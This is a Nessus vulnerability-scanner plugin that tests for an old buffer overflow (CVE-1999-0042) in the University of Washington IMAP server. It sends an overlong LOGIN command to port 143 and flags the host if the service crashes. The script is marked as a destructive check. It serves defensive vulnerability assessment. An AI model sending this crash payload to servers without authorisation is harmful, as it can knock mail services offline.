#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
 script_id(10125);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-1999-0042");
 script_xref(name:"OSVDB", value:"11731");

 script_name(english:"UoW IMAP/POP server_login() Function Remote Overflow");
 script_summary(english:"Imap buffer overflow");

  script_set_attribute(
    attribute:'synopsis',
    value:"The remote mail server is vulnerable to a buffer overflow."
  );

  script_set_attribute(
    attribute:'description',
    value:"A remote buffer overflow in this IMAP server
may allow a remote user to gain root privileges.

University of Washington IMAP server is known to be affected."
  );

  script_set_attribute(
    attribute:'solution',
    value:"Upgrade your imap server to the newest version availble from your vendor."
  );

  script_set_attribute(
    attribute:'see_also',
    value:"http://packetstormsecurity.nl/advisories/nai/SNI-08.IMAP_OVERFLOW.advisory"
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C'
  );

  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
  script_family(english:"Gain a shell remotely");
  script_dependencie("find_service1.nasl");
  script_require_ports("Services/imap", 143);
  exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/imap");
if(!port)port = 143;
if(get_port_state(port))
{
 data = string("1023 LOGIN ", crap(1023), "\r\n");
 soc = open_sock_tcp(port);
 if(soc > 0)
 {
  buf = recv_line(socket:soc, length:1024);
 if(!buf)
 	{
		set_kb_item(name:"imap/false_imap", value:TRUE);
	 	close(soc);
		exit(0);
	}


  if(" BYE " >< buf)exit(0);

  send(socket:soc, data:data);
  buf = recv_line(socket:soc, length:1024);
  if(!buf)
  {
	close (soc);
	soc = open_sock_tcp(port);
        if (!soc)
	{
	  	security_hole(port);
		set_kb_item(name:"imap/overflow", value:TRUE);
	}
  }
  close(soc);
 }
}
